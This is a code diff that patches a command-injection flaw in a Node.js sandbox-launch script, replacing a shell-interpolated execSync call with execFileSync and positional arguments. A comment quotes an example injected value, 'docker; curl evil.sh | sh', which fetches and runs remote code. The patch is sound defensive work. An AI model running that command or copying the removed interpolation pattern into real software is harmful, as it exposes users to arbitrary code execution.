@@ -17,7 +17,7 @@
 // See the License for the specific language governing permissions and
 // limitations under the License.
 
-import { execSync } from 'node:child_process';
+import { execFileSync } from 'node:child_process';
 import { existsSync, readFileSync } from 'node:fs';
 import path from 'node:path';
 const { join, dirname } = path;
@@ -95,16 +95,31 @@ if (!qwenSandbox) {
 qwenSandbox = (qwenSandbox || '').toLowerCase();
 
 const commandExists = (cmd) => {
-  // Use 'where.exe' (not 'where') on Windows because PowerShell aliases
-  // 'where' to 'Where-Object', which breaks command detection.
-  const checkCommand = os.platform() === 'win32' ? 'where.exe' : 'command -v';
+  // Pass `cmd` as a separate argv element (never interpolated into a shell
+  // command string) so a malicious QWEN_SANDBOX value such as
+  // `docker; curl evil.sh | sh` cannot inject extra commands.
+  const check = (candidate) => {
+    if (os.platform() === 'win32') {
+      // Use 'where.exe' (not 'where') because PowerShell aliases 'where' to
+      // 'Where-Object', which breaks command detection.
+      execFileSync('where.exe', [candidate], { stdio: 'ignore' });
+    } else {
+      // 'command -v' is a POSIX shell builtin, so it must run inside a shell.
+      // Bind the candidate to $1 rather than splicing it into the script text.
+      // Use an absolute '/bin/sh' (matching execSync's default) so a
+      // PATH-controlled 'sh' from an untrusted project cannot be run here.
+      execFileSync('/bin/sh', ['-c', 'command -v "$1"', 'sh', candidate], {
+        stdio: 'ignore',
+      });
+    }
+  };
   try {
-    execSync(`${checkCommand} ${cmd}`, { stdio: 'ignore' });
+    check(cmd);
     return true;
   } catch {
     if (os.platform() === 'win32' && !cmd.endsWith('.exe')) {
       try {
-        execSync(`${checkCommand} ${cmd}.exe`, { stdio: 'ignore' });
+        check(`${cmd}.exe`);
         return true;
       } catch {
         return false;
